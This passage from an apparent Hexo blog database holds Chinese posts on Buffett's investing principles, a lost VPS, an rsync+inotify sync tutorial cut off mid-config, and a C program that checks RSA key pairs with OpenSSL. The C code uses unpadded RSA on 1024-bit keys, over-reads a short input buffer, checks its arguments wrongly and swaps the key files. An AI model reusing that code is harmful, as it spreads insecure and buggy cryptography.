基本原则三：放长线，钓大鱼</p>\n作者告诉我们，在衡量公司业绩的时候，巴菲特从来不关心短期结果。他认为，三年是衡量一个公司业绩的“最短期限”，他曾经建议投资人，最少要关注一个公司最近五年的业绩。\n\n那么，巴菲特手下的伯克希尔-哈撒韦公司的长期情况又是如何呢？根据最新的财务报告，从1965年到2019年，伯克希尔-哈撒韦公司每股市值的复合年增长率为20.3%，是“标普500”增长率的2倍多。\n\n如果在把这个“长期”的时间延长，从1964年到2019年，伯克希尔-哈撒韦公司的市值增长率是的2744062%，也就是增长了27440倍多，这个数字十分令人吃惊。\n\n在2020年度致股东公开信中，巴菲特再次说明“放长线、钓大鱼”原则的好处：<strong>它不仅有利于增加成功投资带来的收益，也有利于减少失败投资带来的问题。随着时间的流逝，一些错误的、失败的投资，可以被“治愈”。</strong>\n<p class=\"text-sm-title\">4. 基本原则四：业绩的好坏，要知道跟谁比</p>\n巴菲特很早就说过：业绩是相对的。相对的意思，就是有合适的比较对象。\n\n那个用来比较的标杆，就是可以看成“风向标”的美股几大指数，比如道琼斯指数、标准普尔500指数等。\n\n作者告诉我们，<strong>巴菲特曾经视道琼斯指数为标杆，并以跑赢道琼斯指数为目标</strong>。\n\n如果某一年道琼斯指数下跌了10%，而他的投资只跌了5%，他就认为自己获得了胜利；反过来，如果某一年道琼斯上扬了25%，而他的投资只增长了20%，他就觉得自己失败了，坚决不会为此庆祝。\n<p class=\"text-sm-title\">5. 基本原则五：复利</p>\n巴菲特在给合伙人讲解投资基础时，总会谈到他最喜欢的概念：复利收益。他画过一张“蓝图”，告诉合伙人金钱增长的速度是多么惊人：\n\n“假设投资10万美元，年收益是4%，那么10年后你会得到148024美元；按照同样的收益率，30年之后，这个数字会飙升至324337美元。如果把收益率增加到16%，那么10万美元在30年后将增加到850万美元。”\n\n反过来，巴菲特也曾经告诉合伙人，费用、税收等其他被忽略的因素，可能会让财富大幅缩水。\n\n总而言之：<strong>微小的变量在长期也能带来巨大的变化</strong>。","slug":"巴菲特的基础投资理念记录","published":1,"updated":"2023-04-22T05:38:45.048Z","_id":"clgrjlxkl00937opifps55sdr","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>虽然市场瞬息万变，但是巴菲特的这些基础投资理念，几十年来却都没有变过。他把这些基础投资理念叫做“永不过时的指导</strong></p>\n<p>&amp;nbsp;</p>\n<p class=\"text-sm-title\">1. 基本原则一：永远不去预测市场</p>\n作者告诉我们，巴菲特很早就宣称过，自己根本没有能力预测整个市场的走向。他在书里举了一个例子。\n\n<p>某些合伙人给巴菲特打电话，说某某股票将会像几个月前那样持续利好，应该赶紧买。但是巴菲特对他们的提议，实际上是不屑一顾的。</p>\n<p>巴菲特曾说：“如果他们在2月份就知道道琼斯指数在5月份会达到865点，那他们当时为什么不让我进场？如果合伙人三个月前不能预测道指的走向，那他们凭什么觉得自己突然之间具备了预测能力？”</p>\n<p>换句话说，<strong>巴菲特不仅不喜欢自己去预测市场，也无法忍受那些“擅长”预测的人，尤其是在市场趋势出现之后发表马后炮观点的合伙人。他把这种看法称作“偏见”</strong>。</p>\n<p class=\"text-sm-title\">2. 基本原则二：投资“深度价值”</p>\n投资不看市场趋势，看什么呢？看的就是“深度价值”。这条原则也就是著名的“价值投资原则”。\n\n<p>作者认为，<strong>巴菲特所谓的“深度价值”，就是那些产品过硬、经营有方，但是又很不起眼的公司</strong>。一旦发现这样的公司，他就会开始比较这个公司的实际资产和市场估值。如果市场估值过低，那巴菲特就会毫不犹豫地出手，买那个公司的股票。</p>\n<p>巴菲特曾经说过：“我们买卖股票，不是基于对市场前景的看法，而是要基于对一个公司前景的看法。”</p>\n<p>比如有一次，巴菲特发现了一家默默无闻的公司，名叫“桑伯恩地图”。这家公司做的事情就是给美国的每个城市画地图，而且他们的地图可以精确到每栋楼。巴菲特认为当时的市场严重低估了这个公司的价值，所以他就大量买进这家公司的股票，最后大赚了一笔。</p>\n<p>在2020年度致股东公开信中，巴菲特讲到了什么样的企业才值得收购。他提出了三条标准：</p>\n<blockquote>第一，该企业的净有形资本必须取得良好回报。\n\n<p>第二，该企业必须由能干而诚实的管理者管理。</p>\n<p>第三，该企业必须以合理的价格买到。</blockquote><br>在现实中，符合这三个要求的大型收购机会很少。不过巴菲特觉得这也没关系，他宁愿等待好的机会，也不会对不好的机会出手。</p>\n<p>他曾经说过这么一句话：“只有面对真正的好球时，我才会挥杆打一球”。</p>\n<p class=\"text-big-title\">3. 基本原则三：放长线，钓大鱼</p>\n作者告诉我们，在衡量公司业绩的时候，巴菲特从来不关心短期结果。他认为，三年是衡量一个公司业绩的“最短期限”，他曾经建议投资人，最少要关注一个公司最近五年的业绩。\n\n<p>那么，巴菲特手下的伯克希尔-哈撒韦公司的长期情况又是如何呢？根据最新的财务报告，从1965年到2019年，伯克希尔-哈撒韦公司每股市值的复合年增长率为20.3%，是“标普500”增长率的2倍多。</p>\n<p>如果在把这个“长期”的时间延长，从1964年到2019年，伯克希尔-哈撒韦公司的市值增长率是的2744062%，也就是增长了27440倍多，这个数字十分令人吃惊。</p>\n<p>在2020年度致股东公开信中，巴菲特再次说明“放长线、钓大鱼”原则的好处：<strong>它不仅有利于增加成功投资带来的收益，也有利于减少失败投资带来的问题。随着时间的流逝，一些错误的、失败的投资，可以被“治愈”。</strong></p>\n<p class=\"text-sm-title\">4. 基本原则四：业绩的好坏，要知道跟谁比</p>\n巴菲特很早就说过：业绩是相对的。相对的意思，就是有合适的比较对象。\n\n<p>那个用来比较的标杆，就是可以看成“风向标”的美股几大指数，比如道琼斯指数、标准普尔500指数等。</p>\n<p>作者告诉我们，<strong>巴菲特曾经视道琼斯指数为标杆，并以跑赢道琼斯指数为目标</strong>。</p>\n<p>如果某一年道琼斯指数下跌了10%，而他的投资只跌了5%，他就认为自己获得了胜利；反过来，如果某一年道琼斯上扬了25%，而他的投资只增长了20%，他就觉得自己失败了，坚决不会为此庆祝。</p>\n<p class=\"text-sm-title\">5. 基本原则五：复利</p>\n巴菲特在给合伙人讲解投资基础时，总会谈到他最喜欢的概念：复利收益。他画过一张“蓝图”，告诉合伙人金钱增长的速度是多么惊人：\n\n<p>“假设投资10万美元，年收益是4%，那么10年后你会得到148024美元；按照同样的收益率，30年之后，这个数字会飙升至324337美元。如果把收益率增加到16%，那么10万美元在30年后将增加到850万美元。”</p>\n<p>反过来，巴菲特也曾经告诉合伙人，费用、税收等其他被忽略的因素，可能会让财富大幅缩水。</p>\n<p>总而言之：<strong>微小的变量在长期也能带来巨大的变化</strong>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>虽然市场瞬息万变，但是巴菲特的这些基础投资理念，几十年来却都没有变过。他把这些基础投资理念叫做“永不过时的指导</strong></p>\n<p>&amp;nbsp;</p>\n<p class=\"text-sm-title\">1. 基本原则一：永远不去预测市场</p>\n作者告诉我们，巴菲特很早就宣称过，自己根本没有能力预测整个市场的走向。他在书里举了一个例子。\n\n<p>某些合伙人给巴菲特打电话，说某某股票将会像几个月前那样持续利好，应该赶紧买。但是巴菲特对他们的提议，实际上是不屑一顾的。</p>\n<p>巴菲特曾说：“如果他们在2月份就知道道琼斯指数在5月份会达到865点，那他们当时为什么不让我进场？如果合伙人三个月前不能预测道指的走向，那他们凭什么觉得自己突然之间具备了预测能力？”</p>\n<p>换句话说，<strong>巴菲特不仅不喜欢自己去预测市场，也无法忍受那些“擅长”预测的人，尤其是在市场趋势出现之后发表马后炮观点的合伙人。他把这种看法称作“偏见”</strong>。</p>\n<p class=\"text-sm-title\">2. 基本原则二：投资“深度价值”</p>\n投资不看市场趋势，看什么呢？看的就是“深度价值”。这条原则也就是著名的“价值投资原则”。\n\n<p>作者认为，<strong>巴菲特所谓的“深度价值”，就是那些产品过硬、经营有方，但是又很不起眼的公司</strong>。一旦发现这样的公司，他就会开始比较这个公司的实际资产和市场估值。如果市场估值过低，那巴菲特就会毫不犹豫地出手，买那个公司的股票。</p>\n<p>巴菲特曾经说过：“我们买卖股票，不是基于对市场前景的看法，而是要基于对一个公司前景的看法。”</p>\n<p>比如有一次，巴菲特发现了一家默默无闻的公司，名叫“桑伯恩地图”。这家公司做的事情就是给美国的每个城市画地图，而且他们的地图可以精确到每栋楼。巴菲特认为当时的市场严重低估了这个公司的价值，所以他就大量买进这家公司的股票，最后大赚了一笔。</p>\n<p>在2020年度致股东公开信中，巴菲特讲到了什么样的企业才值得收购。他提出了三条标准：</p>\n<blockquote>第一，该企业的净有形资本必须取得良好回报。\n\n<p>第二，该企业必须由能干而诚实的管理者管理。</p>\n<p>第三，该企业必须以合理的价格买到。</blockquote><br>在现实中，符合这三个要求的大型收购机会很少。不过巴菲特觉得这也没关系，他宁愿等待好的机会，也不会对不好的机会出手。</p>\n<p>他曾经说过这么一句话：“只有面对真正的好球时，我才会挥杆打一球”。</p>\n<p class=\"text-big-title\">3. 基本原则三：放长线，钓大鱼</p>\n作者告诉我们，在衡量公司业绩的时候，巴菲特从来不关心短期结果。他认为，三年是衡量一个公司业绩的“最短期限”，他曾经建议投资人，最少要关注一个公司最近五年的业绩。\n\n<p>那么，巴菲特手下的伯克希尔-哈撒韦公司的长期情况又是如何呢？根据最新的财务报告，从1965年到2019年，伯克希尔-哈撒韦公司每股市值的复合年增长率为20.3%，是“标普500”增长率的2倍多。</p>\n<p>如果在把这个“长期”的时间延长，从1964年到2019年，伯克希尔-哈撒韦公司的市值增长率是的2744062%，也就是增长了27440倍多，这个数字十分令人吃惊。</p>\n<p>在2020年度致股东公开信中，巴菲特再次说明“放长线、钓大鱼”原则的好处：<strong>它不仅有利于增加成功投资带来的收益，也有利于减少失败投资带来的问题。随着时间的流逝，一些错误的、失败的投资，可以被“治愈”。</strong></p>\n<p class=\"text-sm-title\">4. 基本原则四：业绩的好坏，要知道跟谁比</p>\n巴菲特很早就说过：业绩是相对的。相对的意思，就是有合适的比较对象。\n\n<p>那个用来比较的标杆，就是可以看成“风向标”的美股几大指数，比如道琼斯指数、标准普尔500指数等。</p>\n<p>作者告诉我们，<strong>巴菲特曾经视道琼斯指数为标杆，并以跑赢道琼斯指数为目标</strong>。</p>\n<p>如果某一年道琼斯指数下跌了10%，而他的投资只跌了5%，他就认为自己获得了胜利；反过来，如果某一年道琼斯上扬了25%，而他的投资只增长了20%，他就觉得自己失败了，坚决不会为此庆祝。</p>\n<p class=\"text-sm-title\">5. 基本原则五：复利</p>\n巴菲特在给合伙人讲解投资基础时，总会谈到他最喜欢的概念：复利收益。他画过一张“蓝图”，告诉合伙人金钱增长的速度是多么惊人：\n\n<p>“假设投资10万美元，年收益是4%，那么10年后你会得到148024美元；按照同样的收益率，30年之后，这个数字会飙升至324337美元。如果把收益率增加到16%，那么10万美元在30年后将增加到850万美元。”</p>\n<p>反过来，巴菲特也曾经告诉合伙人，费用、税收等其他被忽略的因素，可能会让财富大幅缩水。</p>\n<p>总而言之：<strong>微小的变量在长期也能带来巨大的变化</strong>。</p>\n"},{"title":"不能上网了","date":"2010-05-06T04:40:00.000Z","_content":"网卡，到期了，好可怜啊。<br />这个星期去买网卡，用别人的东西，真的很难开口、<br />学校的服务器安全性变的好高啊，不知道怎么入手了。要镇定，努力学习。。","source":"_posts/不能上网了.md","raw":"title: 不能上网了\ncategories: [生活感想]\ntags: []\ndate: 2010-05-06 12:40:00\n---\n网卡，到期了，好可怜啊。<br />这个星期去买网卡，用别人的东西，真的很难开口、<br />学校的服务器安全性变的好高啊，不知道怎么入手了。要镇定，努力学习。。","slug":"不能上网了","published":1,"updated":"2023-04-22T05:38:44.966Z","_id":"clgrjlxko00957opi9dp0a1yc","comments":1,"layout":"post","photos":[],"link":"","content":"<p>网卡，到期了，好可怜啊。<br />这个星期去买网卡，用别人的东西，真的很难开口、<br />学校的服务器安全性变的好高啊，不知道怎么入手了。要镇定，努力学习。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>网卡，到期了，好可怜啊。<br />这个星期去买网卡，用别人的东西，真的很难开口、<br />学校的服务器安全性变的好高啊，不知道怎么入手了。要镇定，努力学习。。</p>\n"},{"title":"悲剧了","date":"2013-04-13T05:09:27.000Z","_content":"该站点VPS服务商倒闭了（晕，发邮件就是这样说的），但是数据没有了，气死我了。这个vps除了便宜一点好处也没有，稳定的时候没事，抽风的时候有死的感觉，服务商什么也不管，我也按时备份了，写的脚本，没有想到VPS数据没有了，没有异地备。\n以前在dropbox备份一段时间数据，有些数据恢复了，有些通过google cache找回来了， 只有留言没有恢复，其他的都没有问题。\n以后找个好点的服务商，按时备份，血的教训。","source":"_posts/悲剧了.md","raw":"title: 悲剧了\ncategories: [生活感想]\ntags: []\ndate: 2013-04-13 13:09:27\n---\n该站点VPS服务商倒闭了（晕，发邮件就是这样说的），但是数据没有了，气死我了。这个vps除了便宜一点好处也没有，稳定的时候没事，抽风的时候有死的感觉，服务商什么也不管，我也按时备份了，写的脚本，没有想到VPS数据没有了，没有异地备。\n以前在dropbox备份一段时间数据，有些数据恢复了，有些通过google cache找回来了， 只有留言没有恢复，其他的都没有问题。\n以后找个好点的服务商，按时备份，血的教训。","slug":"悲剧了","published":1,"updated":"2023-04-22T05:38:45.063Z","_id":"clgrjlxkp00977opi7j4b1lk7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>该站点VPS服务商倒闭了（晕，发邮件就是这样说的），但是数据没有了，气死我了。这个vps除了便宜一点好处也没有，稳定的时候没事，抽风的时候有死的感觉，服务商什么也不管，我也按时备份了，写的脚本，没有想到VPS数据没有了，没有异地备。<br>以前在dropbox备份一段时间数据，有些数据恢复了，有些通过google cache找回来了， 只有留言没有恢复，其他的都没有问题。<br>以后找个好点的服务商，按时备份，血的教训。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>该站点VPS服务商倒闭了（晕，发邮件就是这样说的），但是数据没有了，气死我了。这个vps除了便宜一点好处也没有，稳定的时候没事，抽风的时候有死的感觉，服务商什么也不管，我也按时备份了，写的脚本，没有想到VPS数据没有了，没有异地备。<br>以前在dropbox备份一段时间数据，有些数据恢复了，有些通过google cache找回来了， 只有留言没有恢复，其他的都没有问题。<br>以后找个好点的服务商，按时备份，血的教训。</p>\n"},{"title":"测试PEM密钥文件是否匹配代码","date":"2013-04-13T04:58:47.000Z","_content":"工作中一直用过很多密钥，有时候为了验证密钥对很麻烦所以用openssl API写了一个小工具\n实际上openssl命令也可以验证的，太麻烦了。\n密钥生成（PEM格式）\n<pr>\nopenssl genrsa -out test.key 1024\nopenssl rsa -in test.key -pubout -out test_pub.key\n</pre>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <openssl/rsa.h>\n#include <openssl/pem.h>\n#include <openssl/err.h>\nchar* my_encrypt(char *, char *);\nchar* my_decrypt(char *, char *);\n//  FunName:测试密钥文件是否匹配\n//  Date:20130314\n//  shell>gcc -o test test.c -lcrypto\nint main(int argc, char **argv)\n{\nchar *str=\"I Love You\";\nchar *ptr_en, *ptr_de;\nchar *rsafile, *rsapubfile;\nif ( argc < 2) {\nprintf(\"Uages: %s id_rsa  id_rsa_pubn\", argv[0]);\nreturn -1;\n}\nrsafile=argv[2];\nrsapubfile=argv[1];\nptr_en=my_encrypt(str,rsafile);\nptr_de=my_decrypt(ptr_en,rsapubfile);\nif(ptr_en==NULL | ptr_de==NULL) {\nprintf(\"encrypt or decrtpt file NOT RSA FILEn\");\nreturn -1;\n}\nif(memcmp(str,ptr_de,strlen(str))==0) {\nprintf(\"rsa_file ok!!!!n\");\n}else{\nprintf(\"rsa_file err!!!n\");\n}\nreturn 0;\n}\nchar *my_encrypt(char *str, char *path_key)\n{\nchar *p_en;\nRSA *p_rsa;\nFILE *file;\nint flen, rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL){\nperror(\"open key file error\");\nreturn NULL;\n}\n//if((p_rsa=PEM_read_RSAPublicKey(file,NULL,NULL,NULL))==NULL) {\n          if((p_rsa=PEM_read_RSA_PUBKEY(file,NULL,NULL,NULL))==NULL){\nERR_print_errors_fp(stdout);\n    return NULL;\n}\nflen=strlen(str);\nrsa_len=RSA_size(p_rsa);\np_en=(unsigned char*)malloc(rsa_len + 1);\nmemset(p_en,0,rsa_len+1);\nif(RSA_public_encrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_en,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_en;\n}\nchar *my_decrypt(char *str,char *path_key)\n{\nchar *p_de;\nRSA *p_rsa;\nFILE *file;\nint flen,rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL) {\nperror(\"open key file error\");\nreturn NULL;\n}\nif((p_rsa=PEM_read_RSAPrivateKey(file,NULL,NULL,NULL))==NULL) {\nERR_print_errors_fp(stdout);\nreturn NULL;\n}\nrsa_len=RSA_size(p_rsa);\np_de=(unsigned char *)malloc(rsa_len + 1);\nmemset(p_de,0, rsa_len + 1);\nif(RSA_private_decrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_de,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_de;\n}\n</pre>","source":"_posts/测试PEM密钥文件是否匹配代码.md","raw":"title: 测试PEM密钥文件是否匹配代码\ncategories: [程序设计,C编程]\ntags: []\ndate: 2013-04-13 12:58:47\n---\n工作中一直用过很多密钥，有时候为了验证密钥对很麻烦所以用openssl API写了一个小工具\n实际上openssl命令也可以验证的，太麻烦了。\n密钥生成（PEM格式）\n<pr>\nopenssl genrsa -out test.key 1024\nopenssl rsa -in test.key -pubout -out test_pub.key\n</pre>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <openssl/rsa.h>\n#include <openssl/pem.h>\n#include <openssl/err.h>\nchar* my_encrypt(char *, char *);\nchar* my_decrypt(char *, char *);\n//  FunName:测试密钥文件是否匹配\n//  Date:20130314\n//  shell>gcc -o test test.c -lcrypto\nint main(int argc, char **argv)\n{\nchar *str=\"I Love You\";\nchar *ptr_en, *ptr_de;\nchar *rsafile, *rsapubfile;\nif ( argc < 2) {\nprintf(\"Uages: %s id_rsa  id_rsa_pubn\", argv[0]);\nreturn -1;\n}\nrsafile=argv[2];\nrsapubfile=argv[1];\nptr_en=my_encrypt(str,rsafile);\nptr_de=my_decrypt(ptr_en,rsapubfile);\nif(ptr_en==NULL | ptr_de==NULL) {\nprintf(\"encrypt or decrtpt file NOT RSA FILEn\");\nreturn -1;\n}\nif(memcmp(str,ptr_de,strlen(str))==0) {\nprintf(\"rsa_file ok!!!!n\");\n}else{\nprintf(\"rsa_file err!!!n\");\n}\nreturn 0;\n}\nchar *my_encrypt(char *str, char *path_key)\n{\nchar *p_en;\nRSA *p_rsa;\nFILE *file;\nint flen, rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL){\nperror(\"open key file error\");\nreturn NULL;\n}\n//if((p_rsa=PEM_read_RSAPublicKey(file,NULL,NULL,NULL))==NULL) {\n          if((p_rsa=PEM_read_RSA_PUBKEY(file,NULL,NULL,NULL))==NULL){\nERR_print_errors_fp(stdout);\n    return NULL;\n}\nflen=strlen(str);\nrsa_len=RSA_size(p_rsa);\np_en=(unsigned char*)malloc(rsa_len + 1);\nmemset(p_en,0,rsa_len+1);\nif(RSA_public_encrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_en,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_en;\n}\nchar *my_decrypt(char *str,char *path_key)\n{\nchar *p_de;\nRSA *p_rsa;\nFILE *file;\nint flen,rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL) {\nperror(\"open key file error\");\nreturn NULL;\n}\nif((p_rsa=PEM_read_RSAPrivateKey(file,NULL,NULL,NULL))==NULL) {\nERR_print_errors_fp(stdout);\nreturn NULL;\n}\nrsa_len=RSA_size(p_rsa);\np_de=(unsigned char *)malloc(rsa_len + 1);\nmemset(p_de,0, rsa_len + 1);\nif(RSA_private_decrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_de,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_de;\n}\n</pre>","slug":"测试PEM密钥文件是否匹配代码","published":1,"updated":"2023-04-22T05:38:45.092Z","_id":"clgrjlxkq00997opibhu6c7sh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>工作中一直用过很多密钥，有时候为了验证密钥对很麻烦所以用openssl API写了一个小工具<br>实际上openssl命令也可以验证的，太麻烦了。<br>密钥生成（PEM格式）<br><pr><br>openssl genrsa -out test.key 1024<br>openssl rsa -in test.key -pubout -out test_pub.key<br></pre></p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <openssl/rsa.h>\n#include <openssl/pem.h>\n#include <openssl/err.h>\nchar* my_encrypt(char *, char *);\nchar* my_decrypt(char *, char *);\n//  FunName:测试密钥文件是否匹配\n//  Date:20130314\n//  shell>gcc -o test test.c -lcrypto\nint main(int argc, char **argv)\n{\nchar *str=\"I Love You\";\nchar *ptr_en, *ptr_de;\nchar *rsafile, *rsapubfile;\nif ( argc < 2) {\nprintf(\"Uages: %s id_rsa  id_rsa_pubn\", argv[0]);\nreturn -1;\n}\nrsafile=argv[2];\nrsapubfile=argv[1];\nptr_en=my_encrypt(str,rsafile);\nptr_de=my_decrypt(ptr_en,rsapubfile);\nif(ptr_en==NULL | ptr_de==NULL) {\nprintf(\"encrypt or decrtpt file NOT RSA FILEn\");\nreturn -1;\n}\nif(memcmp(str,ptr_de,strlen(str))==0) {\nprintf(\"rsa_file ok!!!!n\");\n}else{\nprintf(\"rsa_file err!!!n\");\n}\nreturn 0;\n}\nchar *my_encrypt(char *str, char *path_key)\n{\nchar *p_en;\nRSA *p_rsa;\nFILE *file;\nint flen, rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL){\nperror(\"open key file error\");\nreturn NULL;\n}\n//if((p_rsa=PEM_read_RSAPublicKey(file,NULL,NULL,NULL))==NULL) {\n          if((p_rsa=PEM_read_RSA_PUBKEY(file,NULL,NULL,NULL))==NULL){\nERR_print_errors_fp(stdout);\n    return NULL;\n}\nflen=strlen(str);\nrsa_len=RSA_size(p_rsa);\np_en=(unsigned char*)malloc(rsa_len + 1);\nmemset(p_en,0,rsa_len+1);\nif(RSA_public_encrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_en,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_en;\n}\nchar *my_decrypt(char *str,char *path_key)\n{\nchar *p_de;\nRSA *p_rsa;\nFILE *file;\nint flen,rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL) {\nperror(\"open key file error\");\nreturn NULL;\n}\nif((p_rsa=PEM_read_RSAPrivateKey(file,NULL,NULL,NULL))==NULL) {\nERR_print_errors_fp(stdout);\nreturn NULL;\n}\nrsa_len=RSA_size(p_rsa);\np_de=(unsigned char *)malloc(rsa_len + 1);\nmemset(p_de,0, rsa_len + 1);\nif(RSA_private_decrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_de,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_de;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>工作中一直用过很多密钥，有时候为了验证密钥对很麻烦所以用openssl API写了一个小工具<br>实际上openssl命令也可以验证的，太麻烦了。<br>密钥生成（PEM格式）<br><pr><br>openssl genrsa -out test.key 1024<br>openssl rsa -in test.key -pubout -out test_pub.key<br></pre></p>\n<pre>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <openssl/rsa.h>\n#include <openssl/pem.h>\n#include <openssl/err.h>\nchar* my_encrypt(char *, char *);\nchar* my_decrypt(char *, char *);\n//  FunName:测试密钥文件是否匹配\n//  Date:20130314\n//  shell>gcc -o test test.c -lcrypto\nint main(int argc, char **argv)\n{\nchar *str=\"I Love You\";\nchar *ptr_en, *ptr_de;\nchar *rsafile, *rsapubfile;\nif ( argc < 2) {\nprintf(\"Uages: %s id_rsa  id_rsa_pubn\", argv[0]);\nreturn -1;\n}\nrsafile=argv[2];\nrsapubfile=argv[1];\nptr_en=my_encrypt(str,rsafile);\nptr_de=my_decrypt(ptr_en,rsapubfile);\nif(ptr_en==NULL | ptr_de==NULL) {\nprintf(\"encrypt or decrtpt file NOT RSA FILEn\");\nreturn -1;\n}\nif(memcmp(str,ptr_de,strlen(str))==0) {\nprintf(\"rsa_file ok!!!!n\");\n}else{\nprintf(\"rsa_file err!!!n\");\n}\nreturn 0;\n}\nchar *my_encrypt(char *str, char *path_key)\n{\nchar *p_en;\nRSA *p_rsa;\nFILE *file;\nint flen, rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL){\nperror(\"open key file error\");\nreturn NULL;\n}\n//if((p_rsa=PEM_read_RSAPublicKey(file,NULL,NULL,NULL))==NULL) {\n          if((p_rsa=PEM_read_RSA_PUBKEY(file,NULL,NULL,NULL))==NULL){\nERR_print_errors_fp(stdout);\n    return NULL;\n}\nflen=strlen(str);\nrsa_len=RSA_size(p_rsa);\np_en=(unsigned char*)malloc(rsa_len + 1);\nmemset(p_en,0,rsa_len+1);\nif(RSA_public_encrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_en,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_en;\n}\nchar *my_decrypt(char *str,char *path_key)\n{\nchar *p_de;\nRSA *p_rsa;\nFILE *file;\nint flen,rsa_len;\nif((file=fopen(path_key,\"r\"))==NULL) {\nperror(\"open key file error\");\nreturn NULL;\n}\nif((p_rsa=PEM_read_RSAPrivateKey(file,NULL,NULL,NULL))==NULL) {\nERR_print_errors_fp(stdout);\nreturn NULL;\n}\nrsa_len=RSA_size(p_rsa);\np_de=(unsigned char *)malloc(rsa_len + 1);\nmemset(p_de,0, rsa_len + 1);\nif(RSA_private_decrypt(rsa_len,(unsigned char*)str,(unsigned char*)p_de,p_rsa,RSA_NO_PADDING) < 0) {\nreturn NULL;\n}\nRSA_free(p_rsa);\nfclose(file);\nreturn p_de;\n}\n</pre>"},{"title":"采用rsync+inotify，实现多台web数据动态同步","date":"2011-10-24T05:20:00.000Z","_content":"<p>背景：由于无存储共享设备，web集群中的代码均存放在本地，最终导致web节点之间的数据无法一致。<br /><br />解决办法：采用rsync+inotify，实现多台web数据动态同步<br /><br />解决思路：比如有a、b、c、d四台web，为解决哪台服务器为源数据服务器，我们在a服务器上安装rsync+inotify，然后将一个二级域名指向a服务器，这样以后网站编辑、开发人员之间访问二级域名进行日常网站更新，a服务器在检测到本地有数据更新时，便动态（触发式）向其它服务器发送更新数据<br /><br />选择rsync+inotify的几大理由：在常规的数据同步应用案例中，大多数人会选择使用rsync来完成数据同步，笔者选择rsync+inotify的理由如下<br />1、服务器性能：rsync只能实现定时更新，无论网站有无文件更新，rsync都会按着定时任务去检查文件是否有更新，当数据文件较大时会使服务器性能下降；而rsync+inotify为触发式更新，也就是说只有当某个文件发生改动时才会更新，这样一来对服务器性能影响较小<br />2、数据实时性：如果选择rsync，每隔多长时间同步一次数据是个问题，时间越短，对性能影响就越大。时间太长，用户/编辑无法接受。采用rsync+inotify可实现实时更新，当a服务器文件有更新时，其它服务器立即更新<br /><br />关于inotify介绍<br />Inotify 是文件系统事件监控机制，作为 dnotify 的有效替代。dnotify 是较早内核支持的文件监控机制。Inotify 是一种强大的、细粒度的<br /><br />、异步的机制，它满足各种各样的文件监控需要，不仅限于安全和性能。必须内核支持，触发更新，对系统影响很小。</p><p>利用这种机制自己可以简单写一个，web杀毒，写文件的时候查看文件内容，根据关键词或者加密，判断文件。性能有所影响。</p><p>&nbsp;</p><p>inotify 可以监视的文件系统事件包括：<br />IN_ACCESS，即文件被访问<br />IN_MODIFY，文件被 write<br />IN_ATTRIB，文件属性被修改，如 chmod、chown、touch 等<br />IN_CLOSE_WRITE，可写文件被 close<br />IN_CLOSE_NOWRITE，不可写文件被 close<br />IN_OPEN，文件被 open<br />IN_MOVED_FROM，文件被移走,如 mv<br />IN_MOVED_TO，文件被移来，如 mv、cp<br />IN_CREATE，创建新文件<br />IN_DELETE，文件被删除，如 rm<br />IN_DELETE_SELF，自删除，即一个可执行文件在执行时删除自己<br />IN_MOVE_SELF，自移动，即一个可执行文件在执行时移动自己<br />IN_UNMOUNT，宿主文件系统被 umount<br />IN_CLOSE，文件被关闭，等同于(IN_CLOSE_WRITE | IN_CLOSE_NOWRITE)<br />IN_MOVE，文件被移动，等同于(IN_MOVED_FROM | IN_MOVED_TO)<br />注：上面所说的文件也包括目录。 </p><p><br /></p><p>步骤：<br /><br />环境拓扑<br />a：192.168.1.101<br />b：192.168.1.102<br />c：192.168.1.103<br />d：192.168.1.104<br />注：数据源服务器为a，目标服务器为b、c、d<br /><br /><br /><br />一、目标服务器安装rsync （在b、c、d服务器上操作，安装配置均一样）<br /><br />安装rsync<br />#tar zxvf rsync-3.0.8.tar.gz<br />#cd rsync-3.0.8<br />#./configure &amp;&amp; make &amp;&amp; make install<br /><br /><br />配置rsync<br />#vi /etc/rsync.conf&nbsp; &nbsp; 加入如下内容<br /><br />uid = root<br />gid = root<br />use chroot = no<br />max connections = 20<br />strict modes = yes<br />log file = 